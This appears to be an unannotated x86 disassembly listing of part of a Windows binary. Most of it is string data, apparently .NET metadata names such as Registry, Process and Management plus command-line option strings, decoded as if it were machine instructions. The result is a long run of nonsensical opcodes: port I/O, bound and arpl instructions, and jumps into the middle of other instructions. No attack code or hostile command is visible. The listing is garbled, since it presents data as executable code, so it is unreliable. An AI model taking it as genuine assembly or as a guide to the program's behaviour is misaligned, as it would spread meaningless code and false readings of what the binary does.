  4035d6:	bound  eax,QWORD PTR gs:[ebp+eiz*2+0x73]
  4035db:	imul   esp,DWORD PTR [edi+0x6e],0x73795300
  4035e2:	je     0x403649
  4035e4:	ins    DWORD PTR es:[edi],dx
  4035e5:	inc    esp
  4035e6:	jb     0x403649
  4035e8:	ja     0x403653
  4035ea:	outs   dx,BYTE PTR ds:[esi]
  4035eb:	addr16 inc esp
  4035ed:	gs jae 0x403659
  4035f0:	outs   dx,BYTE PTR ds:[si]
  4035f2:	add    BYTE PTR [ebx+0x79],dl
  4035f5:	jae    0x40366b
  4035f7:	gs ins DWORD PTR es:[edi],dx
  4035f9:	inc    esp
  4035fa:	gs jae 0x403666
  4035fd:	outs   dx,BYTE PTR ds:[si]
  4035ff:	add    BYTE PTR [ebx+0x79],dl
  403602:	jae    0x403678
  403604:	gs ins DWORD PTR es:[edi],dx
  403606:	push   edi
  403607:	bound  eax,QWORD PTR gs:[ebp+0x78]
  40360b:	je     0x403672
  40360d:	outs   dx,BYTE PTR ds:[esi]
  40360e:	jae    0x403679
  403610:	outs   dx,DWORD PTR ds:[esi]
  403611:	outs   dx,BYTE PTR ds:[esi]
  403612:	jae    0x403658
  403614:	gs jae 0x403680
  403617:	outs   dx,BYTE PTR ds:[si]
  403619:	add    BYTE PTR [ebx+0x79],dl
  40361c:	jae    0x403692
  40361e:	gs ins DWORD PTR es:[edi],dx
  403620:	push   edi
  403621:	bound  eax,QWORD PTR gs:[ebp+0x6e]
  403625:	je     0x403690
  403627:	je     0x4036a2
  403629:	inc    esp
  40362a:	gs jae 0x403696
  40362d:	outs   dx,BYTE PTR ds:[si]
  40362f:	add    BYTE PTR [ebp+0x61],cl
  403632:	imul   ebp,DWORD PTR [esi+0x0],0x6f666e49
  403639:	jb     0x4036a8
  40363b:	popa   
  40363c:	je     0x4036a7
  40363e:	outs   dx,DWORD PTR ds:[esi]
  40363f:	outs   dx,BYTE PTR ds:[esi]
  403640:	popa   
  403641:	ins    BYTE PTR es:[edi],dx
  403642:	push   esi
  403643:	gs jb  0x4036b9
  403646:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40364d:	pop    edi
  40364e:	push   eax
  40364f:	jb     0x4036c0
  403651:	fs jne 0x4036b7
  403654:	je     0x4036ac
  403656:	gs jb  0x4036cc
  403659:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  403660:	pop    edi
  403661:	dec    esp
  403662:	outs   dx,DWORD PTR ds:[esi]
  403663:	arpl   WORD PTR [ecx+0x74],sp
  403666:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  40366d:	je     0x4036d4
  40366f:	ins    DWORD PTR es:[edi],dx
  403670:	inc    ebx
  403671:	outs   dx,DWORD PTR ds:[esi]
  403672:	outs   dx,BYTE PTR ds:[esi]
  403673:	imul   sp,WORD PTR [edi+0x75],0x6172
  403679:	je     0x4036e4
  40367b:	outs   dx,DWORD PTR ds:[esi]
  40367c:	outs   dx,BYTE PTR ds:[esi]
  40367d:	add    BYTE PTR [ebx+0x79],dl
  403680:	jae    0x4036f6
  403682:	gs ins DWORD PTR es:[edi],dx
  403684:	cs inc edi
  403686:	ins    BYTE PTR es:[edi],dx
  403687:	outs   dx,DWORD PTR ds:[esi]
  403688:	bound  esp,QWORD PTR [ecx+0x6c]
  40368b:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  403692:	add    BYTE PTR [edi+ebp*2+0x61],cl
  403696:	fs gs jb 0x4036e9
  40369a:	jo     0x403710
  40369c:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  4036a3:	outs   dx,DWORD PTR ds:[esi]
  4036a4:	outs   dx,BYTE PTR ds:[esi]
  4036a5:	add    BYTE PTR [ebx+0x79],dl
  4036a8:	jae    0x40371e
  4036aa:	gs ins DWORD PTR es:[edi],dx
  4036ac:	cs push edx
  4036ae:	gs data16 ins BYTE PTR es:[edi],dx
  4036b1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4036b6:	outs   dx,BYTE PTR ds:[esi]
  4036b7:	add    BYTE PTR [ecx+0x64],al
  4036ba:	fs dec ecx
  4036bc:	outs   dx,BYTE PTR ds:[esi]
  4036bd:	push   ebx
  4036be:	gs ins DWORD PTR es:[di],dx
  4036c1:	outs   dx,BYTE PTR gs:[esi]
  4036c3:	je     0x403709
  4036c5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4036cc:	jns    0x40371c
  4036ce:	outs   dx,DWORD PTR ds:[esi]
  4036cf:	je     0x403717
  4036d1:	outs   dx,DWORD PTR ds:[esi]
  4036d2:	jne    0x403742
  4036d4:	fs inc ebp
  4036d6:	js     0x40373b
  4036d8:	gs jo  0x40374f
  4036db:	imul   ebp,DWORD PTR [edi+0x6e],0x67724100
  4036e2:	jne    0x403751
  4036e4:	outs   dx,BYTE PTR gs:[esi]
  4036e6:	je     0x40372d
  4036e8:	js     0x40374d
  4036ea:	gs jo  0x403761
  4036ed:	imul   ebp,DWORD PTR [edi+0x6e],0x73654400
  4036f4:	arpl   WORD PTR [edx+0x69],si
  4036f7:	jo     0x40376d
  4036f9:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  403700:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  403707:	popa   
  403708:	jb     0x403773
  40370a:	jae    0x40377b
  40370c:	outs   dx,BYTE PTR ds:[esi]
  40370d:	add    BYTE PTR [ebx+0x75],al
  403710:	ins    BYTE PTR es:[edi],dx
  403711:	je     0x403788
  403713:	jb     0x40377a
  403715:	dec    ecx
  403716:	outs   dx,BYTE PTR ds:[esi]
  403717:	outs   dx,WORD PTR ds:[esi]
  403719:	add    BYTE PTR [esi+0x69],al
  40371c:	ins    BYTE PTR es:[edi],dx
  40371d:	gs push esi
  40371f:	gs jb  0x403795
  403722:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  403729:	add    BYTE PTR [edi+0x65],al
  40372c:	je     0x403784
  40372e:	gs jb  0x4037a4
  403731:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  403738:	add    BYTE PTR [edi+0x65],ah
  40373b:	je     0x40379c
  40373d:	push   esp
  40373e:	gs js  0x4037b5
  403741:	dec    ecx
  403742:	outs   dx,BYTE PTR ds:[esi]
  403743:	outs   dx,WORD PTR ds:[esi]
  403745:	add    BYTE PTR [ebp+0x69],cl
  403748:	arpl   WORD PTR [edx+0x6f],si
  40374b:	jae    0x4037bc
  40374d:	data16 je 0x4037a6
  403750:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403757:	jne    0x4037bd
  403759:	imul   ebp,DWORD PTR [edi+0x0],0x74737953
  403760:	gs ins DWORD PTR es:[edi],dx
  403762:	push   edx
  403763:	jne    0x4037d3
  403765:	je     0x4037d0
  403767:	ins    DWORD PTR es:[edi],dx
  403768:	gs push ebx
  40376a:	gs jb  0x4037d6
  40376d:	popa   
  40376e:	ins    BYTE PTR es:[edi],dx
  40376f:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  403776:	inc    esi
  403777:	outs   dx,DWORD PTR ds:[esi]
  403778:	jb     0x4037e7
  40377a:	popa   
  40377b:	je     0x4037f1
  40377d:	gs jb  0x4037f3
  403780:	push   ebx
  403781:	outs   dx,DWORD PTR ds:[esi]
  403782:	popa   
  403783:	jo     0x403785
  403785:	push   ebx
  403786:	jns    0x4037fb
  403788:	je     0x4037ef
  40378a:	ins    DWORD PTR es:[edi],dx
  40378b:	dec    esi
  40378c:	gs je  0x4037d7
  40378f:	je     0x403805
  403791:	jo     0x403793
  403793:	inc    esp
  403794:	popa   
  403795:	imul   ebp,DWORD PTR [ecx+edi*2+0x42],0x646c6975
  40379d:	dec    esi
  40379e:	jne    0x40380d
  4037a0:	bound  esp,QWORD PTR [ebp+0x72]
  4037a3:	add    BYTE PTR [esi+0x4a],dl
  4037a6:	push   ebx
  4037a7:	push   0x43707261
  4037ac:	outs   dx,DWORD PTR ds:[esi]
  4037ad:	fs gs push eax
  4037b0:	jb     0x403821
  4037b2:	jbe    0x40381d
  4037b4:	fs gs jb 0x4037b8
  4037b8:	dec    ecx
  4037b9:	inc    esi
  4037ba:	outs   dx,DWORD PTR ds:[esi]
  4037bb:	jb     0x40382a
  4037bd:	popa   
  4037be:	je     0x403810
  4037c0:	jb     0x403831
  4037c2:	jbe    0x40382d
  4037c4:	fs gs jb 0x4037c8
  4037c8:	addr16 gs je 0x40382b
  4037cc:	push   edx
  4037cd:	gs jae 0x40383f
  4037d0:	jne    0x403844
  4037d2:	arpl   WORD PTR [ebp+0x4d],sp
  4037d5:	popa   
  4037d6:	outs   dx,BYTE PTR ds:[esi]
  4037d7:	popa   
  4037d8:	addr16 gs jb 0x4037dc
  4037dc:	push   ebx
  4037dd:	jns    0x403852
  4037df:	je     0x403846
  4037e1:	ins    DWORD PTR es:[edi],dx
  4037e2:	cs inc ebx
  4037e4:	outs   dx,DWORD PTR ds:[esi]
  4037e5:	fs gs inc esp
  4037e8:	outs   dx,DWORD PTR ds:[esi]
  4037e9:	ins    DWORD PTR es:[edi],dx
  4037ea:	cs inc ebx
  4037ec:	outs   dx,DWORD PTR ds:[esi]
  4037ed:	ins    DWORD PTR es:[edi],dx
  4037ee:	jo     0x403859
  4037f0:	ins    BYTE PTR es:[edi],dx
  4037f1:	gs jb  0x4037f4
  4037f4:	dec    ebp
  4037f5:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4037fc:	je     0x403854
  4037fe:	push   ebx
  4037ff:	inc    esp
  403800:	gs jae 0x40386c
  403803:	outs   dx,BYTE PTR ds:[si]
  403805:	gs jb  0x403808
  403808:	addr16 gs je 0x40386b
  40380c:	push   ebp
  40380d:	outs   dx,BYTE PTR ds:[esi]
  40380e:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  403812:	outs   dx,BYTE PTR ds:[esi]
  403813:	push   eax
  403814:	popa   
  403815:	jb     0x403878
  403817:	ins    DWORD PTR es:[edi],dx
  403818:	gs je  0x403880
  40381b:	jb     0x40381d
  40381d:	push   esp
  40381e:	gs js  0x403895
  403821:	push   edi
  403822:	jb     0x40388d
  403824:	je     0x40388b
  403826:	jb     0x403828
  403828:	addr16 gs je 0x40388b
  40382c:	inc    ebp
  40382d:	jb     0x4038a1
  40382f:	outs   dx,DWORD PTR ds:[esi]
  403830:	jb     0x403832
  403832:	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  403837:	add    BYTE PTR [edx+0x75],al
  40383a:	imul   ebp,DWORD PTR [esp+eiz*2+0x52],0x73697665
  403842:	imul   ebp,DWORD PTR [edi+0x6e],0x727453
  403849:	inc    esp
  40384a:	popa   
  40384b:	imul   ebp,DWORD PTR [ecx+edi*2+0x42],0x646c6975
  403853:	dec    esi
  403854:	jne    0x4038c3
  403856:	bound  esp,QWORD PTR [ebp+0x72]
  403859:	push   ebx
  40385a:	je     0x4038ce
  40385c:	add    BYTE PTR [ebp+eiz*2+0x66],al
  403860:	popa   
  403861:	jne    0x4038cf
  403863:	je     0x4038a6
  403865:	ins    BYTE PTR es:[edi],dx
  403866:	imul   esp,DWORD PTR [ecx+0x73],0x73795300
  40386d:	je     0x4038d4
  40386f:	ins    DWORD PTR es:[edi],dx
  403870:	dec    esi
  403871:	jne    0x4038e0
  403873:	gs jb  0x4038df
  403876:	arpl   WORD PTR [ebx+0x0],si
  403879:	push   ebx
  40387a:	jns    0x4038ef
  40387c:	je     0x4038e3
  40387e:	ins    DWORD PTR es:[edi],dx
  40387f:	cs inc esp
  403881:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  403888:	imul   esp,DWORD PTR [ebx+0x73],0x73795300
  40388f:	je     0x4038f6
  403891:	ins    DWORD PTR es:[edi],dx
  403892:	push   edi
  403893:	bound  edx,QWORD PTR gs:[ebx+0x65]
  403897:	jb     0x40390f
  403899:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  4038a0:	jae    0x403916
  4038a2:	gs ins DWORD PTR es:[edi],dx
  4038a4:	inc    ebp
  4038a5:	outs   dx,BYTE PTR ds:[esi]
  4038a6:	je     0x40390d
  4038a8:	jb     0x40391a
  4038aa:	jb     0x403915
  4038ac:	jae    0x403913
  4038ae:	push   ebx
  4038af:	gs jb  0x403928
  4038b2:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  4038b9:	jae    0x40392f
  4038bb:	gs ins DWORD PTR es:[edi],dx
  4038bd:	cs push edx
  4038bf:	jne    0x40392f
  4038c1:	je     0x40392c
  4038c3:	ins    DWORD PTR es:[edi],dx
  4038c4:	gs cs dec ecx
  4038c7:	outs   dx,BYTE PTR ds:[esi]
  4038c8:	je     0x40392f
  4038ca:	jb     0x40393b
  4038cc:	jo     0x403921
  4038ce:	gs jb  0x403947
  4038d1:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  4038d8:	jae    0x40394e
  4038da:	gs ins DWORD PTR es:[edi],dx
  4038dc:	cs push edx
  4038de:	jne    0x40394e
  4038e0:	je     0x40394b
  4038e2:	ins    DWORD PTR es:[edi],dx
  4038e3:	gs cs inc ebx
  4038e6:	outs   dx,DWORD PTR ds:[esi]
  4038e7:	ins    DWORD PTR es:[edi],dx
  4038e8:	jo     0x403953
  4038ea:	ins    BYTE PTR es:[edi],dx
  4038eb:	gs jb  0x403941
  4038ee:	gs jb  0x403967
  4038f1:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  4038f8:	jae    0x40396e
  4038fa:	gs ins DWORD PTR es:[edi],dx
  4038fc:	inc    esp
  4038fd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  403904:	jns    0x403959
  403906:	gs jb  0x40397f
  403909:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  403910:	jae    0x403986
  403912:	gs ins DWORD PTR es:[edi],dx
  403914:	cs push edx
  403916:	gs jae 0x403988
  403919:	jne    0x40398d
  40391b:	arpl   WORD PTR [ebp+0x73],sp
  40391e:	add    BYTE PTR [ebx+0x79],dl
  403921:	jae    0x403997
  403923:	gs ins DWORD PTR es:[edi],dx
  403925:	cs push esp
  403927:	outs   dx,DWORD PTR ds:[esi]
  403928:	outs   dx,DWORD PTR ds:[esi]
  403929:	ins    BYTE PTR es:[edi],dx
  40392a:	jae    0x40395a
  40392c:	push   ebx
  40392d:	je     0x4039a1
  40392f:	imul   ebp,DWORD PTR [esi+0x67],0x65722e73
  403936:	jae    0x4039a7
  403938:	jne    0x4039ac
  40393a:	arpl   WORD PTR [ebp+0x73],sp
  40393d:	add    BYTE PTR [ebp+eiz*2+0x62],al
  403941:	jne    0x4039aa
  403943:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  40394b:	jae    0x40394d
  40394d:	push   ebx
  40394e:	je     0x4039c2
  403950:	imul   ebp,DWORD PTR [esi+0x67],0x72610073
  403957:	addr16 jae 0x40395a
  40395a:	inc    ebp
  40395b:	jno    0x4039d2
  40395d:	popa   
  40395e:	ins    BYTE PTR es:[edi],dx
  40395f:	jae    0x403961
  403961:	push   ebx
  403962:	jns    0x4039d7
  403964:	je     0x4039cb
  403966:	ins    DWORD PTR es:[edi],dx
  403967:	cs push esp
  403969:	outs   dx,DWORD PTR ds:[esi]
  40396a:	outs   dx,DWORD PTR ds:[esi]
  40396b:	ins    BYTE PTR es:[edi],dx
  40396c:	jae    0x40396e
  40396e:	push   ebx
  40396f:	jns    0x4039e4
  403971:	je     0x4039d8
  403973:	ins    DWORD PTR es:[edi],dx
  403974:	push   edi
  403975:	imul   ebp,DWORD PTR [esi+0x64],0x4673776f
  40397c:	outs   dx,DWORD PTR ds:[esi]
  40397d:	jb     0x4039ec
  40397f:	jae    0x403981
  403981:	dec    ebp
  403982:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403989:	je     0x4039e1
  40398b:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403992:	jne    0x4039f8
  403994:	imul   ebp,DWORD PTR [edi+0x57],0x6f646e69
  40399b:	ja     0x403a10
  40399d:	inc    esi
  40399e:	outs   dx,DWORD PTR ds:[esi]
  40399f:	jb     0x403a0e
  4039a1:	jae    0x4039a3
  4039a3:	push   edx
  4039a4:	bound  esi,QWORD PTR gs:[ebp+0x69]
  4039a8:	ins    BYTE PTR es:[edi],dx
  4039a9:	fs inc ecx
  4039ab:	fs fs dec ecx
  4039ae:	outs   dx,BYTE PTR ds:[esi]
  4039af:	jae    0x4039b1
  4039b1:	push   ebp
  4039b2:	jo     0x403a18
  4039b4:	popa   
  4039b5:	je     0x403a1c
  4039b7:	inc    ecx
  4039b8:	fs fs dec ecx
  4039bb:	outs   dx,BYTE PTR ds:[esi]
  4039bc:	jae    0x4039be
  4039be:	push   ebx
  4039bf:	jns    0x403a34
  4039c1:	je     0x403a28
  4039c3:	ins    DWORD PTR es:[edi],dx
  4039c4:	push   edi
  4039c5:	bound  eax,QWORD PTR gs:[ebp+0x78]
  4039c9:	je     0x403a30
  4039cb:	outs   dx,BYTE PTR ds:[esi]
  4039cc:	jae    0x403a37
  4039ce:	outs   dx,DWORD PTR ds:[esi]
  4039cf:	outs   dx,BYTE PTR ds:[esi]
  4039d0:	jae    0x4039d2
  4039d2:	push   ebx
  4039d3:	jns    0x403a48
  4039d5:	je     0x403a3c
  4039d7:	ins    DWORD PTR es:[edi],dx
  4039d8:	push   edi
  4039d9:	bound  edx,QWORD PTR gs:[edx+0x65]
  4039dd:	addr16 jne 0x403a4c
  4039e0:	popa   
  4039e1:	jb     0x403a28
  4039e3:	js     0x403a55
  4039e5:	jb     0x403a4c
  4039e7:	jae    0x403a5c
  4039e9:	imul   ebp,DWORD PTR [edi+0x6e],0x79530073
  4039f0:	jae    0x403a66
  4039f2:	gs ins DWORD PTR es:[edi],dx
  4039f4:	inc    ebx
  4039f5:	outs   dx,DWORD PTR ds:[esi]
  4039f6:	ins    DWORD PTR es:[edi],dx
  4039f7:	jo     0x403a68
  4039f9:	outs   dx,BYTE PTR ds:[esi]
  4039fa:	outs   dx,BYTE PTR gs:[esi]
  4039fc:	je     0x403a4b
  4039fe:	outs   dx,DWORD PTR ds:[esi]
  4039ff:	fs gs ins BYTE PTR es:[edi],dx
  403a02:	inc    esp
  403a03:	popa   
  403a04:	je     0x403a67
  403a06:	inc    ecx
  403a07:	outs   dx,BYTE PTR ds:[esi]
  403a08:	outs   dx,BYTE PTR ds:[esi]
  403a09:	outs   dx,DWORD PTR ds:[esi]
  403a0a:	je     0x403a6d
  403a0c:	je     0x403a77
  403a0e:	outs   dx,DWORD PTR ds:[esi]
  403a0f:	outs   dx,BYTE PTR ds:[esi]
  403a10:	jae    0x403a12
  403a12:	push   ebx
  403a13:	jns    0x403a88
  403a15:	je     0x403a7c
  403a17:	ins    DWORD PTR es:[edi],dx
  403a18:	push   edi
  403a19:	bound  eax,QWORD PTR gs:[ecx+0x62]
  403a1d:	jae    0x403a93
  403a1f:	jb     0x403a82
  403a21:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  403a25:	outs   dx,BYTE PTR ds:[esi]
  403a26:	jae    0x403a28
  403a28:	push   ebx
  403a29:	jns    0x403a9e
  403a2b:	je     0x403a92
  403a2d:	ins    DWORD PTR es:[edi],dx
  403a2e:	push   ebx
  403a2f:	gs jb  0x403aa8
  403a32:	imul   esp,DWORD PTR [ebx+0x65],0x636f7250
  403a39:	gs jae 0x403aaf
  403a3c:	add    BYTE PTR [esi+0x6f],al
  403a3f:	jb     0x403aae
  403a41:	popa   
  403a42:	je     0x403a44
  403a44:	dec    edi
  403a45:	bound  ebp,QWORD PTR [edx+0x65]
  403a48:	arpl   WORD PTR [eax+eax*1+0x43],si
  403a4c:	outs   dx,DWORD PTR ds:[esi]
  403a4d:	jo     0x403ac8
  403a4f:	jb     0x403aba
  403a51:	addr16 push 0x79530074
  403a57:	jae    0x403acd
  403a59:	gs ins DWORD PTR es:[edi],dx
  403a5b:	inc    esp
  403a5c:	popa   
  403a5d:	je     0x403ac0
  403a5f:	dec    edi
  403a60:	jb     0x403ac3
  403a62:	arpl   WORD PTR [ebp+eiz*2+0x43],bp
  403a66:	ins    BYTE PTR es:[edi],dx
  403a67:	imul   esp,DWORD PTR [ebp+0x6e],0x79530074
  403a6e:	jae    0x403ae4
  403a70:	gs ins DWORD PTR es:[edi],dx
  403a72:	dec    ebp
  403a73:	popa   
  403a74:	outs   dx,BYTE PTR ds:[esi]
  403a75:	popa   
  403a76:	gs ins DWORD PTR es:[di],dx
  403a79:	outs   dx,BYTE PTR gs:[esi]
  403a7b:	je     0x403a7d
  403a7d:	push   ebx
  403a7e:	jns    0x403af3
  403a80:	je     0x403ae7
  403a82:	ins    DWORD PTR es:[edi],dx
  403a83:	inc    esp
  403a84:	gs jo  0x403af3
  403a87:	outs   dx,DWORD PTR ds:[esi]
  403a88:	jns    0x403af7
  403a8a:	outs   dx,BYTE PTR gs:[esi]
  403a8c:	je     0x403a8e
  403a8e:	addr16 gs je 0x403af1
  403a92:	dec    ebp
  403a93:	jne    0x403b08
  403a95:	je     0x403ae5
  403a97:	outs   dx,DWORD PTR ds:[esi]
  403a98:	je     0x403aed
  403a9a:	jo     0x403b01
  403a9c:	arpl   WORD PTR [ecx+0x66],bp
  403a9f:	jns    0x403ae3
  403aa1:	outs   dx,DWORD PTR ds:[esi]
  403aa2:	je     0x403b0c
  403aa4:	push   eax
  403aa5:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  403aac:	dec    edi
  403aad:	jb     0x403af0
  403aaf:	fs fs dec ecx
  403ab2:	outs   dx,BYTE PTR ds:[esi]
  403ab3:	push   edx
  403ab4:	outs   dx,DWORD PTR ds:[esi]
  403ab5:	outs   dx,DWORD PTR ds:[esi]
  403ab6:	je     0x403ab8
  403ab8:	addr16 gs je 0x403b1b
  403abc:	dec    ebp
  403abd:	jne    0x403b32
  403abf:	je     0x403b14
  403ac1:	jo     0x403b28
  403ac3:	arpl   WORD PTR [ecx+0x66],bp
  403ac6:	jns    0x403b18
  403ac8:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  403acf:	dec    edi
  403ad0:	jb     0x403b13
  403ad2:	fs fs dec ecx
  403ad5:	outs   dx,BYTE PTR ds:[esi]
  403ad6:	push   edx
  403ad7:	outs   dx,DWORD PTR ds:[esi]
  403ad8:	outs   dx,DWORD PTR ds:[esi]
  403ad9:	je     0x403adb
  403adb:	dec    ebp
  403adc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403ae3:	je     0x403b2f
  403ae5:	push   ebx
  403ae6:	arpl   WORD PTR [edx+0x69],si
  403ae9:	jo     0x403b5f
  403aeb:	add    BYTE PTR [ebx+0x79],dl
  403aee:	jae    0x403b64
  403af0:	gs ins DWORD PTR es:[edi],dx
  403af2:	dec    esi
  403af3:	gs je  0x403b3e
  403af6:	je     0x403b6c
  403af8:	jo     0x403b51
  403afa:	bound  edx,QWORD PTR gs:[edx+0x65]
  403afe:	jno    0x403b75
  403b00:	gs jae 0x403b77
  403b03:	add    BYTE PTR [ebx+0x79],dl
  403b06:	jae    0x403b7c
  403b08:	gs ins DWORD PTR es:[edi],dx
  403b0a:	cs push esp
  403b0c:	gs js  0x403b83
  403b0f:	add    BYTE PTR [ebx+0x79],dl
  403b12:	jae    0x403b88
  403b14:	gs ins DWORD PTR es:[edi],dx
  403b16:	push   esp
  403b17:	push   0x64616572
  403b1c:	imul   ebp,DWORD PTR [esi+0x67],0x6b736154
  403b23:	jae    0x403b69
  403b25:	popa   
  403b26:	je     0x403b89
  403b28:	data16 ins BYTE PTR es:[edi],dx
  403b2a:	outs   dx,DWORD PTR ds:[esi]
  403b2b:	ja     0x403b2d
  403b2d:	inc    ebp
  403b2e:	arpl   WORD PTR [ebp+0x61],bp
  403b31:	push   eax
  403b32:	jne    0x403b96
  403b34:	ins    BYTE PTR es:[edi],dx
  403b35:	imul   esp,DWORD PTR [ebx+0x4b],0x53007965
  403b3c:	push   0x64657261
  403b41:	dec    esp
  403b42:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  403b49:	arpl   WORD PTR [ebx+0x65],cx
  403b4c:	jns    0x403b4e
  403b4e:	push   ebx
  403b4f:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x67696c72
  403b57:	push   0x616c5074
  403b5c:	je     0x403bc4
  403b5e:	outs   dx,DWORD PTR ds:[esi]
  403b5f:	jb     0x403bce
  403b61:	push   eax
  403b62:	jne    0x403bc6
  403b64:	ins    BYTE PTR es:[edi],dx
  403b65:	imul   esp,DWORD PTR [ebx+0x4b],0x41007965
  403b6c:	push   ebx
  403b6d:	push   eax
  403b6e:	inc    edx
  403b6f:	jb     0x403be0
  403b71:	ja     0x403be6
  403b73:	gs jb  0x403bb9
  403b76:	popa   
  403b77:	jo     0x403bec
  403b79:	push   eax
  403b7a:	jne    0x403bde
  403b7c:	ins    BYTE PTR es:[edi],dx
  403b7d:	imul   esp,DWORD PTR [ebx+0x4b],0x4d007965
  403b84:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403b8b:	je     0x403bdd
  403b8d:	jne    0x403bf1
  403b8f:	ins    BYTE PTR es:[edi],dx
  403b90:	imul   esp,DWORD PTR [ebx+0x4b],0x53007965
  403b97:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x67696c72
  403b9f:	push   0x62755074
  403ba4:	ins    BYTE PTR es:[edi],dx
  403ba5:	imul   esp,DWORD PTR [ebx+0x4b],0x46007965
  403bac:	pop    eax
  403bad:	inc    ecx
  403bae:	jae    0x403c23
  403bb0:	gs ins DWORD PTR es:[edi],dx
  403bb2:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403bb6:	addr16 gs je 0x403c19
  403bba:	inc    ecx
  403bbb:	jae    0x403c30
  403bbd:	gs ins DWORD PTR es:[edi],dx
  403bbf:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403bc3:	inc    edi
  403bc4:	gs je  0x403c0a
  403bc7:	popa   
  403bc8:	ins    BYTE PTR es:[edi],dx
  403bc9:	ins    BYTE PTR es:[edi],dx
  403bca:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  403bd1:	ins    DWORD PTR es:[edi],dx
  403bd2:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403bd6:	push   esp
  403bd7:	push   0x73417369
  403bdc:	jae    0x403c43
  403bde:	ins    DWORD PTR es:[edi],dx
  403bdf:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403be3:	inc    ecx
  403be4:	push   ebx
  403be5:	push   eax
  403be6:	inc    edx
  403be7:	jb     0x403c58
  403be9:	ja     0x403c5e
  403beb:	gs jb  0x403c31
  403bee:	popa   
  403bef:	jo     0x403c64
  403bf1:	inc    esi
  403bf2:	popa   
  403bf3:	arpl   WORD PTR [edi+ebp*2+0x72],si
  403bf7:	jns    0x403bf9
  403bf9:	outs   dx,DWORD PTR ds:[esi]
  403bfa:	jo     0x403c5b
  403bfc:	inc    ebp
  403bfd:	jno    0x403c74
  403bff:	popa   
  403c00:	ins    BYTE PTR es:[edi],dx
  403c01:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x74737953
  403c09:	gs ins DWORD PTR es:[edi],dx
  403c0b:	push   ebx
  403c0c:	arpl   WORD PTR gs:[ebp+0x72],si
  403c10:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x754e7349
  403c18:	ins    BYTE PTR es:[edi],dx
  403c19:	ins    BYTE PTR es:[edi],dx
  403c1a:	dec    edi
  403c1b:	jb     0x403c62
  403c1d:	ins    DWORD PTR es:[edi],dx
  403c1e:	jo     0x403c94
  403c20:	jns    0x403c22
  403c22:	add    BYTE PTR [eax],al
  403c24:	add    BYTE PTR [ebx],cl
  403c26:	add    BYTE PTR gs:[esi+0x0],ch
  403c2a:	sub    eax,0x53005500
  403c2f:	add    BYTE PTR [ecx],al
  403c31:	add    eax,0x3f002d
  403c36:	add    DWORD PTR ds:0x3f002f,eax
  403c3c:	add    BYTE PTR [edi],cl
  403c3e:	sub    eax,0x69007300
  403c43:	add    BYTE PTR [eax+eax*1+0x65],ch
  403c47:	add    BYTE PTR [esi+0x0],ch
  403c4a:	je     0x403c4c
  403c4c:	add    DWORD PTR [ecx],edx
  403c4e:	sub    eax,0x65007200
  403c53:	add    BYTE PTR [edx+0x0],ah
  403c56:	jne    0x403c58
  403c58:	imul   eax,DWORD PTR [eax],0x64006c
  403c5e:	add    DWORD PTR [edi],edx
  403c60:	sub    eax,0x64006100
  403c65:	add    BYTE PTR [eax+eax*1+0x69],ah
  403c69:	add    BYTE PTR [esi+0x0],ch
  403c6c:	jb     0x403c6e
  403c6e:	outs   dx,DWORD PTR ds:[esi]
  403c6f:	add    BYTE PTR [edi+0x0],ch
  403c72:	je     0x403c74
  403c74:	cmp    al,BYTE PTR [eax]
  403c76:	add    DWORD PTR ds:0x70002d,ebx
  403c7c:	imul   eax,DWORD PTR [eax],0x650070
  403c82:	ins    BYTE PTR es:[edi],dx
  403c83:	add    BYTE PTR [ecx+0x0],ch
  403c86:	outs   dx,BYTE PTR ds:[esi]
  403c87:	add    BYTE PTR [ebp+0x0],ah
  403c8a:	jb     0x403c8c
  403c8c:	outs   dx,DWORD PTR ds:[esi]
  403c8d:	add    BYTE PTR [edi+0x0],ch
  403c90:	je     0x403c92
  403c92:	cmp    al,BYTE PTR [eax]
  403c94:	add    DWORD PTR [ecx],ebp
  403c96:	push   ebx
  403c97:	add    BYTE PTR [ecx+0x0],bh
  403c9a:	jae    0x403c9c
  403c9c:	je     0x403c9e
  403c9e:	add    BYTE PTR gs:[ebp+0x0],ch
  403ca2:	add    BYTE PTR cs:[eax+eax*1+0x6f],dl
  403ca7:	add    BYTE PTR [edi+0x0],ch
